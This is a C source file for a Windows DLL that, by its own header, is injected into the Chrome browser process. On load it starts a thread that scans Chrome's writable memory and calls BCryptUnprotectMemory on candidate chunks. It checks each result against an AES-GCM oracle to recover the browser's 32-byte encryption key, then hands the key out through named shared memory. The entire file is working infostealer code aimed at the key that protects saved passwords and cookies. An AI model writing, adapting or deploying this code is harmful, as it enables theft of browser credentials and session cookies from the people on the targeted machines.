/*
 * chrome_key_helper.c — helper DLL injected into chrome.exe browser process
 *
 * Runs inside Chrome (same-process) so BCryptUnprotectMemory works.
 * Scans all READWRITE pages, tries to unprotect 32-byte chunks, verifies
 * each against an AES-256-GCM oracle stored in a shared memory segment.
 *
 * Shared memory name: "ChromeKeyExtract_{chrome_pid}"
 * Done event name:    "ChromeKeyDone_{chrome_pid}"
 *
 * Shared memory layout: CHROME_KEY_SHM (see below)
 */

#include <windows.h>
#include <bcrypt.h>

#define SHM_MAGIC    0xCEC0FFEE
#define BCRYPT_SAME_PROC 0x00000000

typedef NTSTATUS (WINAPI *BcryptUnprotect_t)(PVOID, ULONG, ULONG);
static BcryptUnprotect_t g_BCryptUnprotectMemory = NULL;

static void _resolve_bcrypt_unprotect(void)
{
    if (g_BCryptUnprotectMemory) return;
    HMODULE hB = GetModuleHandleA("bcrypt.dll");
    if (!hB) hB = LoadLibraryA("bcrypt.dll");
    if (hB) g_BCryptUnprotectMemory =
        (BcryptUnprotect_t)GetProcAddress(hB, "BCryptUnprotectMemory");
}

#pragma pack(push, 1)
typedef struct {
    DWORD  magic;          /* SHM_MAGIC — sanity check                     */
    BYTE   nonce[12];      /* GCM nonce for oracle blob                     */
    BYTE   ct[512];        /* ciphertext                                    */
    DWORD  ct_len;         /* ciphertext byte count                         */
    BYTE   tag[16];        /* GCM authentication tag                        */
    /* output */
    volatile int found;    /* 1 when key located                            */
    BYTE   key[32];        /* decrypted AES-256 key                         */
    /* debug */
    volatile LONG dbg_pages;   /* READWRITE pages scanned                  */
    volatile LONG dbg_unprotect_ok; /* BCryptUnprotectMemory success count  */
    volatile LONG dbg_gcm_tried;    /* AES-GCM oracle checks attempted      */
} CHROME_KEY_SHM;
#pragma pack(pop)

/* AES-256-GCM verify: returns TRUE if key decrypts oracle ct+tag correctly */
static BOOL _aes_gcm_ok(const BYTE *key, CHROME_KEY_SHM *s)
{
    BCRYPT_ALG_HANDLE hA = NULL;
    BCRYPT_KEY_HANDLE hK = NULL;
    BOOL ok = FALSE;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hA, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return FALSE;

    WCHAR mode[] = BCRYPT_CHAIN_MODE_GCM;
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hA, BCRYPT_CHAINING_MODE,
                                          (PUCHAR)mode, sizeof(mode), 0)))
        goto done;

    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hA, &hK, NULL, 0,
                                                   (PUCHAR)key, 32, 0)))
        goto done;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = s->nonce;
    ai.cbNonce = 12;
    ai.pbTag   = s->tag;
    ai.cbTag   = 16;

    BYTE pt[512] = {0};
    ULONG olen = 0;
    ok = BCRYPT_SUCCESS(BCryptDecrypt(hK, s->ct, s->ct_len, &ai,
                                      NULL, 0, pt, s->ct_len + 16, &olen, 0));
    SecureZeroMemory(pt, sizeof(pt));

done:
    if (hK) BCryptDestroyKey(hK);
    if (hA) BCryptCloseAlgorithmProvider(hA, 0);
    return ok;
}

static DWORD WINAPI _scan_thread(LPVOID unused)
{
    (void)unused;
    char name[64];
    wsprintfA(name, "ChromeKeyExtract_%lu", (unsigned long)GetCurrentProcessId());

    HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, name);
    if (!hMap) return 1;

    CHROME_KEY_SHM *shm = (CHROME_KEY_SHM *)MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (!shm || shm->magic != SHM_MAGIC) {
        if (shm) UnmapViewOfFile(shm);
        CloseHandle(hMap);
        return 1;
    }

    char ename[64];
    wsprintfA(ename, "ChromeKeyDone_%lu", (unsigned long)GetCurrentProcessId());
    HANDLE hEvt = OpenEventA(EVENT_MODIFY_STATE, FALSE, ename);

    _resolve_bcrypt_unprotect();
    if (!g_BCryptUnprotectMemory) goto cleanup;

    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = NULL;

    while (VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi) && !shm->found) {
        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;

        if (mbi.State != MEM_COMMIT) continue;
        if (!(mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) continue;
        if (mbi.RegionSize < 32 || mbi.RegionSize > 64 * 1024 * 1024) continue;

        /* Allocate copy so we don't disturb Chrome's pages */
        BYTE *copy = (BYTE *)VirtualAlloc(NULL, mbi.RegionSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!copy) continue;

        RtlCopyMemory(copy, mbi.BaseAddress, mbi.RegionSize);
        InterlockedIncrement(&shm->dbg_pages);

        /*
         * 8-byte stride: BCryptProtectMemory pads to 16 bytes but the key
         * may sit at offset 8 from a 16-byte alignment boundary within a struct.
         * BCryptUnprotectMemory returns error quickly for non-protected chunks.
         */
        for (size_t off = 0; off + 32 <= mbi.RegionSize && !shm->found; off += 8) {
            BYTE chunk[32];
            RtlCopyMemory(chunk, copy + off, 32);

            NTSTATUS ns = g_BCryptUnprotectMemory(chunk, 32, BCRYPT_SAME_PROC);
            if (BCRYPT_SUCCESS(ns)) {
                InterlockedIncrement(&shm->dbg_unprotect_ok);
                InterlockedIncrement(&shm->dbg_gcm_tried);
                if (_aes_gcm_ok(chunk, shm)) {
                    RtlCopyMemory((BYTE *)shm->key, chunk, 32);
                    shm->found = 1;
                }
                SecureZeroMemory(chunk, 32);
            }
        }

        SecureZeroMemory(copy, mbi.RegionSize);
        VirtualFree(copy, 0, MEM_RELEASE);
    }

cleanup:

    if (hEvt) { SetEvent(hEvt); CloseHandle(hEvt); }
    UnmapViewOfFile(shm);
    CloseHandle(hMap);
    return shm ? shm->found : 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    (void)lpReserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HANDLE ht = CreateThread(NULL, 0, _scan_thread, NULL, 0, NULL);
        if (ht) CloseHandle(ht);
    }
    return TRUE;
}
